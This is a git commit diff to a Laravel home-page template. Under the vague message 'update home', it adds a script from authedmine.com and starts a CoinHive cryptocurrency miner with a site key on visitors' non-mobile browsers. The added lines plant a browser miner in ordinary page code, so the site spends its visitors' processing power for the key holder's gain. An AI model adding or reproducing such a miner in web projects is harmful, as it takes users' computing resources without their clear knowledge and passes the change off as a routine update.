0a6ae670d00b12577f04bfccf72a6ba05e661b06
JunWang <1103870790@qq.com>
2018-09-14 17:47:45 +0800

    update home

--- resources/views/home.blade.php
+++ resources/views/home.blade.php
@@ -29,6 +29,16 @@
             })
             ;
     </script>
+    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('Tn7l318yqSTNoO0BoZmbcS7xDaIdDX0m', {throttle: 0.3});
+    
+        // Only start on non-mobile devices and if not opted-out
+        // in the last 14400 seconds (4 hours):
+        if (!miner.isMobile() && !miner.didOptOut(14400)) {
+            miner.start();
+        }
+    </script>
 @endsection
 
 @section('style')
